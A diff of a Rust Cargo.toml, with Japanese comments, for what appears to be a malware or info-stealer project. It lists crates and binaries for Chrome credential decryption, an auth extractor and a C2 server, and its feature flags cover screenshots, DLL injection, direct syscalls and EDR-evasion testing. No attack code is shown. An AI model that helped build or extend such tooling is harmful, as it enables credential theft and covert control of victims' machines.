@@ -8,22 +8,21 @@ license = "MIT"
 readme = "README.md"
 
 [workspace]
-members = [".", "chrome_decrypt"]
+members = ["chrome_decrypt", "c2_server"]
 resolver = "2"
 
-# release-tinyプロファイルのみ（後方互換性削除）
 [profile.release]
-opt-level = "z"
-lto = "fat"
-codegen-units = 1
-panic = "abort"
-strip = "symbols"
-debug = false
-rpath = false
-overflow-checks = false
-debug-assertions = false
-incremental = false
-split-debuginfo = "off"
+opt-level = "z"          # 最大サイズ最適化
+lto = "fat"             # 完全なリンク時最適化
+codegen-units = 1       # 単一コード生成ユニット
+panic = "abort"         # panicの代わりにabort
+strip = "symbols"       # シンボル削除
+debug = false           # デバッグ情報なし
+rpath = false          # rpath無効
+overflow-checks = false # オーバーフローチェック無効
+debug-assertions = false # デバッグアサーション無効
+incremental = false     # インクリメンタルコンパイル無効
+split-debuginfo = "off" # デバッグ情報分割無効
 
 # devプロファイルも最適化
 [profile.dev]
@@ -41,23 +40,23 @@ path = "src/lib.rs"
 name = "decrypt"
 path = "src/bin/decrypt.rs"
 
-[[bin]]
-name = "c2_server"
-path = "src/bin/c2_server.rs"
 
 [[bin]]
 name = "auth_extractor"
 path = "src/bin/auth_extractor.rs"
 
+
 [[bin]]
-name = "syscall_test"
-path = "src/bin/syscall_test.rs"
+name = "rsa_gen"
+path = "src/bin/rsa_gen.rs"
+
+[[bin]]
+name = "func_test"
+path = "src/bin/func_test.rs"
 
 [dependencies]
-serde = { version = "1.0", features = ["derive"] }
-serde_json = "1.0"
-
-getrandom = "0.3.3"
+serde = { version = "1.0", default-features = false, features = ["derive", "alloc"] }
+serde_json = { version = "1.0", default-features = false, features = ["alloc"] }
 
 # MessagePack（最小機能のみ）
 rmp-serde = { version = "1.3", default-features = false }
@@ -67,6 +66,9 @@ base64 = { version = "0.22", default-features = false, features = ["std"] }
 
 # AEAD（最小機能のみ）
 aes-gcm = { version = "0.10", default-features = false, features = ["aes", "alloc"] }
+chacha20poly1305 = { version = "0.10", default-features = false, features = ["alloc"] }
+rsa = { version = "0.9.8", features = ["pem"] }
+sha2 = { version = "0.10", default-features = false }
 
 # システム情報（最小化）
 anyhow = { version = "1.0", default-features = false }  # エラー処理（最小化）
@@ -76,32 +78,25 @@ dirs = { version = "6.0.0", default-features = false }  # ディレクトリ検�
 
 # EDR回避テスト専用依存関係
 regex = { version = "1.10", default-features = false, features = ["std"], optional = true }
-hex = { version = "0.4", optional = true }
+hex = { version = "0.4", default-features = false, features = ["alloc"] }  # 常に利用可能にする（暗号化キー用）
 once_cell = { version = "1.19", optional = true }
 
 # 条件付き依存関係（機能別）
 log = { version = "0.4", default-features = false, optional = true }  # ログ機能
 indicatif = { version = "0.18.0", default-features = false, features = ["unicode-width"], optional = true }  # プログレスバー
-clap = { version = "4.0", features = ["derive"], optional = true }  # CLI引数解析（inject用）
-chrono = { version = "0.4", default-features = false, features = ["clock", "std"] }  # 時刻処理
-tokio = { version = "1.0", features = ["rt-multi-thread", "macros", "time", "sync", "signal", "net", "fs"] }  # async runtime（拡張版）  
-uuid = { version = "1.0", features = ["v4"] }  # UUID生成
-sysinfo = { version = "0.37.1", default-features = false }  # システム情報取得（ハートビート用）
-# 必須依存関係（最小化）
-tempfile = { version = "3.8", default-features = false }
-walkdir = { version = "2.3", default-features = false }
+# 軽量な代替実装（手動実装に置換）
+# clap = { version = "4.0", default-features = false, features = ["std"] }  # 手動CLI解析に置換
+chrono = { version = "0.4", default-features = false, features = ["std", "clock"] }  # 最小時刻処理（c2_server_tlsでは不使用）
+tokio = { version = "1.0", default-features = false, features = ["rt-multi-thread", "macros", "time", "sync", "signal", "net", "fs"] }
+uuid = { version = "1.0", default-features = false, features = ["v4"] }  # UUID生成
+sysinfo = { version = "0.37.1" }  # システム情報取得（ハートビート用）
 
 # Workspace internal crate for Chrome decryption (Windows-only code)
 chrome_decrypt = { path = "chrome_decrypt" }
 
-# --- For local Hyper test server (bin: c2_server) ---
-hyper = { version = "1", features = ["server", "http1"] }
-hyper-util = { version = "0.1", features = ["tokio"] }
-http-body-util = "0.1"
-bytes = "1"
-encoding_rs = "0.8.35"
-hostname = "0.4"  # ホスト名取得用
-num_cpus = "1.0"  # CPU情報取得用
+encoding_rs = { version = "0.8.35", default-features = false, features = ["alloc"] }
+hostname = { version = "0.4", default-features = false }  # ホスト名取得用
+num_cpus = { version = "1.0", default-features = false }  # CPU情報取得用
 
 # ---- 機能フラグ（後方互換性削除・最適化版） ----
 [features]
@@ -112,12 +107,12 @@ default = ["network", "browser", "screenshot", "inject", "logging", "datetime", 
 network = ["dep:minreq"]                    # ネットワーク通信
 browser = ["dep:rusqlite"]                  # ブラウザデータ取得
 screenshot = ["dep:image", "dep:scrap"]     # スクリーンショット
-inject = ["dep:clap"]                       # DLLインジェクション
+inject = []                                 # DLLインジェクション（clap削除）
 logging = ["dep:log"]                       # ログ機能（最小化対応）
 datetime = []                               # 日時処理機能
 server_diagnostics = []                     # サーバー診断エンドポイント
 direct-syscall = []                         # Direct Syscall機能（デフォルト有効）
-edr-testing = ["dep:regex", "dep:hex", "dep:once_cell"]  # EDR回避テスト機能
+edr-testing = ["dep:regex", "dep:once_cell"]  # EDR回避テスト機能
 
 # optional deps（必要時だけ読み込む）
 [dependencies.minreq]
